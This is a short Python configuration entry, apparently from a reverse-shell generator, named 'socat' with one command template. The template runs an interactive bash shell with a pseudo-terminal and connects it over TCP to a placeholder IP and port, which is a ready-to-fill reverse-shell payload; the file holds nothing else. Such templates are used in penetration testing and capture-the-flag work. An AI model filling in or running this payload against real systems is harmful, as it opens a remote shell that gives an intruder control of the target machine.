conf = {
    "name": "socat",
    "templates": [
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%IP%:%PORT%",
    ]
}
